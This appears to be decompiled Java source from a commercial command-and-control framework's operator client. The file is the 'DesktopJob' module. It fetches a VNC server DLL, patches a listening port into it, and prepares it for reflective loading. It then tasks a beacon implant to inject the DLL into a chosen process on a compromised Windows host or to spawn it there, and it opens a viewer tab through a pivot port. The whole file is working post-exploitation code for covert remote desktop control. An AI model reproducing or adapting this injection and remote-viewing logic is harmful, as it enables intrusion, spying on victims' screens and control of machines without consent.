package beacon.jobs;

import aggressor.DataUtils;
import aggressor.Prefs;
import beacon.CommandBuilder;
import beacon.TaskBeacon;
import com.glavsoft.viewer.Viewer;
import common.BeaconEntry;
import common.Callback;
import common.CommonUtils;
import common.ReflectiveDLL;
import console.AssociatedPanel;
import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

public class DesktopJob implements Callback {
   protected TaskBeacon tasker;
   protected CommandBuilder builder = new CommandBuilder();
   protected String bid;
   protected int vport;
   protected int pid;
   protected boolean quality;
   protected boolean is64 = false;
   protected boolean isInject = false;

   public DesktopJob(TaskBeacon var1) {
      this.tasker = var1;
   }

   public String getTactic() {
      return "T1113";
   }

   protected void StartViewer(final String var1, final int var2, boolean var3) {
      String var4 = DataUtils.getTeamServerIP(this.tasker.getClient().getData());
      BeaconEntry var5 = DataUtils.getBeacon(this.tasker.getClient().getData(), var1);
      final String var6 = var5.title("Desktop");
      new Viewer(var4, var2, var3, new Viewer.ViewerCallback() {
         public void connected(final Viewer var1x) {
            AssociatedPanel var2x = new AssociatedPanel(var1);
            var2x.setLayout(new BorderLayout());
            var2x.add(var1x, "Center");
            DesktopJob.this.tasker.getClient().getTabManager().addTab(var6, var2x, new ActionListener() {
               public void actionPerformed(ActionEvent var1xx) {
                  DesktopJob.this.tasker.getClient().getConnection().call("beacons.pivot_stop_port", CommonUtils.args(var2));
                  (new Thread(new Runnable() {
                     public void run() {
                        var1x.closeApp();
                     }
                  }, "VNC Viewer Cleanup")).start();
               }
            }, "VNC client");
         }
      });
   }

   public void inject(String var1, int var2, String var3, boolean var4) {
      this.bid = var1;
      this.quality = var4;
      this.isInject = true;
      this.pid = var2;
      this.is64 = "x64".equals(var3);
      this.vport = Prefs.getPreferences().getRandomPort("client.vncports.string", "5000-9999");
      BeaconEntry var5 = DataUtils.getBeacon(this.tasker.getClient().getData(), var1);
      if (var5 == null) {
         this.tasker.error("Could not find Beacon entry (wait for it to checkin)");
      } else {
         if (this.is64) {
            this.tasker.getClient().getConnection().call("aggressor.resource", CommonUtils.args("winvnc.x64.dll"), this);
         } else {
            this.tasker.getClient().getConnection().call("aggressor.resource", CommonUtils.args("winvnc.x86.dll"), this);
         }

      }
   }

   public void spawn(String var1, String var2, boolean var3) {
      this.bid = var1;
      this.quality = var3;
      this.is64 = "x64".equals(var2);
      BeaconEntry var4 = DataUtils.getBeacon(this.tasker.getClient().getData(), var1);
      if (var4 == null) {
         this.tasker.error("Could not find Beacon entry (wait for it to checkin)");
      } else {
         this.vport = Prefs.getPreferences().getRandomPort("client.vncports.string", "5000-9999");
         if (this.is64) {
            this.tasker.getClient().getConnection().call("aggressor.resource", CommonUtils.args("winvnc.x64.dll"), this);
         } else {
            this.tasker.getClient().getConnection().call("aggressor.resource", CommonUtils.args("winvnc.x86.dll"), this);
         }

      }
   }

   public byte[] fix(byte[] var1) {
      String var2 = CommonUtils.pad(this.vport + "", '\u0000', 32);
      var1 = CommonUtils.patch(var1, "VNC AAAABBBBCCCC", var2);
      return var1;
   }

   public void result(String var1, Object var2) {
      byte[] var3 = this.fix((byte[])((byte[])var2));
      byte[] var4;
      if (this.isInject) {
         if (this.is64) {
            var4 = ReflectiveDLL.patchDOSHeaderX64(var3, 170532320);
            this.builder.setCommand(46);
         } else {
            var4 = ReflectiveDLL.patchDOSHeader(var3, 170532320);
            this.builder.setCommand(45);
         }

         this.builder.addShort(this.vport);
         this.builder.addInteger(this.pid);
         this.builder.addInteger(0);
         this.builder.addString(var4);
      } else {
         if (this.is64) {
            var4 = ReflectiveDLL.patchDOSHeaderX64(var3);
            this.builder.setCommand(91);
         } else {
            var4 = ReflectiveDLL.patchDOSHeader(var3);
            this.builder.setCommand(18);
         }

         this.builder.addShort(this.vport);
         this.builder.addString(var4);
      }

      byte[] var5 = this.builder.build();
      this.tasker.whitelistPort(this.bid, this.vport);
      if (this.isInject) {
         String var6 = this.is64 ? "x64" : "x86";
         this.tasker.task(this.bid, var5, "Tasked beacon to inject VNC server into " + this.pid + "/" + var6);
      } else {
         this.tasker.task(this.bid, var5, "Tasked beacon to spawn VNC server");
      }

      this.StartViewer(this.bid, this.vport, this.quality);
   }
}
